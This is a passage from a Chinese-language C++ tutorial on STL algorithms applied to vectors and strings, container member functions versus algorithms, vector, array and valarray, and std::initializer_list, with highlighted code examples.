class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. find_if: 查找第一个偶数</span></span><br><span class="line">    <span class="keyword">auto</span> it_even = <span class="built_in">std</span>::find_if(nums.begin(), nums.end(),</span><br><span class="line">                                [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x % <span class="number">2</span> == <span class="number">0</span>; &#125;);</span><br><span class="line">    <span class="keyword">if</span> (it_even != nums.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First even number: &quot;</span> &lt;&lt; *it_even &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. sort: 按绝对值大小排序 (自定义比较)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mixed = &#123;<span class="number">3</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-9</span>, <span class="number">2</span>, <span class="number">-6</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::sort(mixed.begin(), mixed.end(),</span><br><span class="line">              [](<span class="keyword">int</span> a, <span class="keyword">int</span> b)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">abs</span>(a) &lt; <span class="built_in">std</span>::<span class="built_in">abs</span>(b); &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted by absolute value: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : mixed) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: -1 -1 2 3 4 5 -6 -9 (或类似，取决于稳定排序)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. transform: 将所有元素平方</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">squares</span><span class="params">(nums.size())</span></span>; <span class="comment">// 目标容器需要足够大</span></span><br><span class="line">    <span class="built_in">std</span>::transform(nums.begin(), nums.end(), squares.begin(),</span><br><span class="line">                   [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x * x; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Squares: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : squares) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 9 1 16 1 25 81 4 36</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. accumulate: 计算所有元素的和</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="built_in">std</span>::accumulate(nums.begin(), nums.end(), <span class="number">0</span>); <span class="comment">// 0 是初始值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 31</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. for_each: 对每个元素执行操作</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Person&gt; people = &#123;&#123;<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>&#125;, &#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">25</span>&#125;, &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">35</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;People: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::for_each(people.begin(), people.end(),</span><br><span class="line">                  [](<span class="keyword">const</span> Person&amp; p)&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p.name &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.age &lt;&lt; <span class="string">&quot;) &quot;</span>; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Alice(30) Bob(25) Charlie(35)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-6-3-STL-和-string-类"><a href="#16-6-3-STL-和-string-类" class="headerlink" title="16.6.3 STL 和 string 类"></a>16.6.3 STL 和 string 类</h3><p><code>std::string</code> 类虽然不是 STL 容器（它没有 <code>value_type</code> 等嵌套类型定义），但它提供了与 STL 兼容的接口，特别是<strong>迭代器</strong> (<code>begin()</code>, <code>end()</code> 等）。因此，许多 STL 算法可以直接应用于 <code>std::string</code> 对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt; // for ::tolower</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> str = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 find 查找字符</span></span><br><span class="line">    <span class="keyword">auto</span> it_l = <span class="built_in">std</span>::find(str.begin(), str.end(), <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (it_l != str.end()) &#123;</span><br><span class="line">        <span class="comment">// 计算索引</span></span><br><span class="line">        <span class="keyword">size_t</span> index = <span class="built_in">std</span>::distance(str.begin(), it_l);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;l&#x27; first found at index: &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 count_if 统计小写字母数量</span></span><br><span class="line">    <span class="keyword">int</span> lower_count = <span class="built_in">std</span>::count_if(str.begin(), str.end(),</span><br><span class="line">                                   [](<span class="keyword">char</span> c)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">islower</span>(c); &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase count: &quot;</span> &lt;&lt; lower_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 transform 将字符串转为小写</span></span><br><span class="line">    <span class="built_in">std</span>::transform(str.begin(), str.end(), str.begin(), <span class="comment">// 可以原地修改</span></span><br><span class="line">                   [](<span class="keyword">unsigned</span> <span class="keyword">char</span> c)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">tolower</span>(c); &#125;); <span class="comment">// 使用 unsigned char 避免负值问题</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase string: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: hello world</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 reverse 反转字符串</span></span><br><span class="line">    <span class="built_in">std</span>::reverse(str.begin(), str.end());</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reversed string: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: dlrow olleh</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 <code>string</code> 类本身也提供了许多成员函数（如 <code>find</code>, <code>replace</code>），但使用 STL 算法有时可以提供更通用或更强大的功能（例如配合 lambda 使用复杂条件）。</p><h3 id="16-6-4-函数和容器方法"><a href="#16-6-4-函数和容器方法" class="headerlink" title="16.6.4 函数和容器方法"></a>16.6.4 函数和容器方法</h3><p>有时，容器本身提供了与某个 STL 算法功能相似的<strong>成员函数</strong>。例如：</p><ul><li>  <code>list</code> 有自己的 <code>sort()</code> 成员函数。</li><li>  <code>list</code> 有自己的 <code>remove()</code> 和 <code>remove_if()</code> 成员函数。</li><li>  <code>list</code> 有自己的 <code>unique()</code> 成员函数。</li><li>  <code>set</code>, <code>map</code> 等关联容器有 <code>find()</code> 成员函数。</li></ul><p><strong>何时使用成员函数 vs. STL 算法？</strong></p><ul><li><strong>优先使用成员函数 (如果可用且满足需求):</strong> 容器的成员函数通常能更好地利用容器的内部结构进行优化。<ul><li>  例如，<code>list::sort()</code> 比 <code>std::sort(list.begin(), list.end())</code> (如果 <code>list</code> 迭代器支持的话，但它不支持随机访问，所以不能用 <code>std::sort</code>) 更高效，因为它只需要重新链接节点，而不需要移动元素。</li><li>  <code>list::remove()</code> 可以真正地从链表中删除节点并调整大小，而 <code>std::remove</code> 不能。</li><li>  关联容器的 <code>find()</code> 成员函数利用其内部树或哈希结构，复杂度为 O(log N) 或 O(1)，而 <code>std::find</code> 是线性扫描 O(N)。</li></ul></li><li><strong>使用 STL 算法:</strong><ul><li>  当容器没有提供相应的成员函数时。</li><li>  当需要跨不同容器类型使用统一的算法时。</li><li>  当需要更复杂的、成员函数不支持的操作逻辑时（例如，使用 <code>std::remove_copy_if</code> 将不满足条件的元素复制到另一个容器）。</li></ul></li></ul><h3 id="16-6-5-使用-STL"><a href="#16-6-5-使用-STL" class="headerlink" title="16.6.5 使用 STL"></a>16.6.5 使用 STL</h3><p>掌握 STL 的关键在于理解其三个核心组件如何协同工作：</p><ol><li> <strong>选择合适的容器:</strong> 根据数据存储和访问的需求选择 <code>vector</code>, <code>list</code>, <code>map</code>, <code>set</code> 等。</li><li> <strong>使用迭代器指定范围:</strong> 通过 <code>begin()</code>, <code>end()</code> 或其他方式获取迭代器来定义算法操作的元素区间 <code>[first, last)</code>。</li><li> <strong>选择合适的算法:</strong> 从 <code>&lt;algorithm&gt;</code> 或 <code>&lt;numeric&gt;</code> 中选择能完成所需任务的算法。</li><li> <strong>提供自定义逻辑 (如果需要):</strong> 通过函数对象、lambda 表达式或函数指针向算法传递自定义的比较、判断或操作规则。</li></ol><p>STL 是一个强大而灵活的库，熟练使用它可以大大提高 C++ 编程的效率和代码质量。建议多查阅文档（如 cppreference.com）了解各种容器、算法和迭代器的详细用法和要求。</p><h2 id="16-7-其他库"><a href="#16-7-其他库" class="headerlink" title="16.7 其他库"></a>16.7 其他库</h2><p>除了 <code>string</code> 类、智能指针和 STL 的核心组件（容器、算法、迭代器）之外，C++ 标准库还提供了许多其他有用的工具和类。本节将简要介绍 <code>valarray</code> 类和 C++11 引入的 <code>initializer_list</code>。</p><h3 id="16-7-1-vector、valarray-和-array"><a href="#16-7-1-vector、valarray-和-array" class="headerlink" title="16.7.1 vector、valarray 和 array"></a>16.7.1 vector、valarray 和 array</h3><p>我们在前面章节已经接触过 <code>vector</code> 和 <code>array</code>，它们都提供了类似数组的功能，但各有特点。标准库还在 <code>&lt;valarray&gt;</code> 头文件中提供了另一个模板类 <code>std::valarray</code>，它主要设计用于<strong>数值计算</strong>，特别是对整个数组进行高效的元素级算术运算。</p><ul><li><p><strong><code>std::vector&lt;T&gt;</code>:</strong></p><ul><li>  <strong>头文件:</strong> <code>&lt;vector&gt;</code></li><li>  <strong>大小:</strong> 动态大小，可运行时增长和收缩。</li><li>  <strong>内存:</strong> 保证元素连续存储。</li><li>  <strong>主要特点:</strong> 通用的动态数组，支持丰富的 STL 算法，尾部插入/删除高效。</li><li>  <strong>数值运算:</strong> 不直接支持元素级的算术运算符（例如，两个 <code>vector</code> 不能直接相加）。需要手动循环或使用 <code>std::transform</code> 等算法。</li></ul></li><li><p><strong><code>std::array&lt;T, N&gt;</code> (C++11):</strong></p><ul><li>  <strong>头文件:</strong> <code>&lt;array&gt;</code></li><li>  <strong>大小:</strong> <strong>固定大小</strong> <code>N</code>，在编译时确定。</li><li>  <strong>内存:</strong> 保证元素连续存储，通常在栈上分配（如果是局部变量且大小适中）。</li><li>  <strong>主要特点:</strong> 对 C 风格数组的类型安全封装，支持 STL 算法，性能与 C 风格数组相当。</li><li>  <strong>数值运算:</strong> 与 <code>vector</code> 类似，不直接支持元素级运算。</li></ul></li><li><p><strong><code>std::valarray&lt;T&gt;</code>:</strong></p><ul><li>  <strong>头文件:</strong> <code>&lt;valarray&gt;</code></li><li>  <strong>大小:</strong> 动态大小（但通常在创建后大小变化不频繁）。</li><li>  <strong>内存:</strong> 不保证连续存储（实现可能进行优化，如分块）。</li><li>  <strong>主要特点:</strong> <strong>专为数值计算设计</strong>。重载了算术运算符 (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code> 等）以支持<strong>元素级 (element-wise)</strong> 操作。还提供了许多数学函数（如 <code>abs</code>, <code>sqrt</code>, <code>sin</code>, <code>cos</code> 等）的应用版本。</li><li>  <strong>STL 兼容性:</strong> 与标准 STL 算法的兼容性不如 <code>vector</code> 和 <code>array</code> 好（例如，其迭代器可能不是标准类别）。</li></ul></li></ul><p><strong>比较总结:</strong></p><table><thead><tr><th align="left">特性</th><th align="left"><code>std::vector&lt;T&gt;</code></th><th align="left"><code>std::array&lt;T, N&gt;</code> (C++11)</th><th align="left"><code>std::valarray&lt;T&gt;</code></th></tr></thead><tbody><tr><td align="left"><strong>头文件</strong></td><td align="left"><code>&lt;vector&gt;</code></td><td align="left"><code>&lt;array&gt;</code></td><td align="left"><code>&lt;valarray&gt;</code></td></tr><tr><td align="left"><strong>大小</strong></td><td align="left">动态</td><td align="left">固定 (编译时)</td><td align="left">动态</td></tr><tr><td align="left"><strong>内存</strong></td><td align="left">连续</td><td align="left">连续</td><td align="left">不保证连续</td></tr><tr><td align="left"><strong>主要用途</strong></td><td align="left">通用动态数组</td><td align="left">C 数组的安全替代品</td><td align="left">数值计算</td></tr><tr><td align="left"><strong>元素级运算</strong></td><td align="left">否</td><td align="left">否</td><td align="left"><strong>是</strong></td></tr><tr><td align="left"><strong>STL 算法</strong></td><td align="left">完全兼容</td><td align="left">完全兼容</td><td align="left">有限兼容</td></tr></tbody></table><p><strong><code>valarray</code> 示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // for iota</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 valarray 进行元素级运算</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v1 = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v2 = &#123;<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v_sum, v_prod;</span><br><span class="line"></span><br><span class="line">    v_sum = v1 + v2;   <span class="comment">// 元素级相加: &#123;1.5, 2.5, 3.5, 4.5&#125;</span></span><br><span class="line">    v_prod = v1 * <span class="number">2.0</span>; <span class="comment">// 每个元素乘以 2.0: &#123;2.0, 4.0, 6.0, 8.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;v1 + v2 = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : v_sum) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// C++11 range-based for 可能不直接支持 valarray</span></span><br><span class="line">    <span class="comment">// 使用传统循环或下标访问</span></span><br><span class="line">    <span class="comment">// for (size_t i = 0; i &lt; v_sum.size(); ++i) std::cout &lt;&lt; v_sum[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;v1 * 2.0 = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; v_prod.size(); ++i) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; v_prod[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 应用数学函数</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v_sqrt = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(v_prod); <span class="comment">// 对每个元素求平方根</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sqrt(v_prod) = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; v_sqrt.size(); ++i) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; v_sqrt[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对比 vector (需要算法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; vec1 = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">vec_prod</span><span class="params">(vec1.size())</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::transform(vec1.begin(), vec1.end(), vec_prod.begin(),</span><br><span class="line">                   [](<span class="keyword">double</span> x)&#123; <span class="keyword">return</span> x * <span class="number">2.0</span>; &#125;);</span><br><span class="line">    <span class="comment">// vec_prod 现在是 &#123;2.0, 4.0, 6.0, 8.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你的主要任务是进行向量化或矩阵式的数值计算，<code>valarray</code> 可能是一个值得考虑的选择，尽管在现代 C++ 中，也有许多第三方库（如 Eigen, Blaze）提供了更强大和灵活的线性代数功能。对于通用的动态序列存储，<code>vector</code> 仍然是首选。</p><h3 id="16-7-2-模板-initializer-list（C-11）"><a href="#16-7-2-模板-initializer-list（C-11）" class="headerlink" title="16.7.2 模板 initializer_list（C++11）"></a>16.7.2 模板 initializer_list（C++11）</h3><p>C++11 引入了一个新的模板类 <code>std::initializer_list&lt;T&gt;</code>，定义在 <code>&lt;initializer_list&gt;</code> 头文件中。它是一个轻量级的代理对象，代表了一个用<strong>花括号 <code>&#123;&#125;</code></strong> 初始化的值列表，其中所有值的类型都是 <code>T</code> 或可以隐式转换为 <code>T</code>。</p><p><strong>主要目的:</strong> 使得函数（尤其是构造函数）能够接受<strong>任意数量</strong>的、类型相同的初始化值，就像内置数组或聚合类型那样使用花括号初始化一样。</p><p><strong>特点:</strong></p><ul><li>  <strong>轻量级:</strong> <code>initializer_list</code> 对象本身通常只包含指向底层（临时）数组的指针和数组的大小。复制 <code>initializer_list</code> 对象是浅拷贝，开销很小。</li><li>  <strong>只读访问:</strong> 通过 <code>initializer_list</code> 访问其元素通常是只读的 (<code>const T&amp;</code>)。你不能通过 <code>initializer_list</code> 修改列表中的元素。</li><li>  <strong>生命周期:</strong> <code>initializer_list</code> 引用的底层数组的生命周期与 <code>initializer_list</code> 对象本身相关联，通常是临时的。不要存储 <code>initializer_list</code> 对象并在其原始上下文之外使用。</li><li>  <strong>迭代器:</strong> 提供了 <code>begin()</code> 和 <code>end()</code> 成员函数，返回指向底层数组的 <code>const T*</code> 指针，可以方便地遍历列表中的元素。</li><li>  <strong><code>size()</code>:</strong> 返回列表中的元素数量。</li></ul><p><strong>如何工作:</strong> 当编译器遇到一个需要 <code>std::initializer_list&lt;T&gt;</code> 参数的地方，并且你提供了一个 <code>&#123;value1, value2, ...&#125;</code> 形式的初始化列表时，编译器会自动：</p><ol><li> 创建一个临时的、类型为 <code>const T</code> 的数组，并将列表中的值存储进去。</li><li> 创建一个 <code>std::initializer_list&lt;T&gt;</code> 对象，使其内部指针指向这个临时数组的开头，并记录数组的大小。</li><li> 将这个 <code>initializer_list&lt;T&gt;</code> 对象传递给函数或构造函数。</li></ol><h3 id="16-7-3-使用-initializer-list"><a href="#16-7-3-使用-initializer-list" class="headerlink" title="16.7.3 使用 initializer_list"></a>16.7.3 使用 initializer_list</h3><p><code>initializer_list</code> 最常见的用途是作为函数或构造函数的参数类型。</p><p><strong>1. 作为函数参数:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数接受一个 initializer_list&lt;int&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_ints</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;<span class="keyword">int</span>&gt; il)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing &quot;</span> &lt;&lt; il.size() &lt;&lt; <span class="string">&quot; integers: &quot;</span>;</span><br><span class="line">    <span class="comment">// 可以使用范围 for 循环遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">int</span>&amp; val : il) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 或者使用 begin()/end()</span></span><br><span class="line">    <span class="comment">// for (auto it = il.begin(); it != il.end(); ++it) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; *it &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板函数接受任意类型的 initializer_list</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">sum_list</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;T&gt; il)</span> </span>&#123;</span><br><span class="line">    T total&#123;&#125;; <span class="comment">// 值初始化 (对于数值类型为 0)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> T&amp; val : il) &#123;</span><br><span class="line">        total += val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    print_ints(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;); <span class="comment">// 直接传递花括号列表</span></span><br><span class="line">    print_ints(&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;);</span><br><span class="line">    print_ints(&#123;&#125;); <span class="comment">// 传递空列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> total_int = sum_list(&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>&#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of ints: &quot;</span> &lt;&lt; total_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> total_double = sum_list(&#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>&#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of doubles: &quot;</span> &lt;&lt; total_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6.6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::string total_string = sum_list&lt;std::string&gt;(&#123;&quot;Hello&quot;, &quot; &quot;, &quot;World&quot;&#125;); // 也可以用于支持 += 的类型</span></span><br><span class="line">    <span class="comment">// std::cout 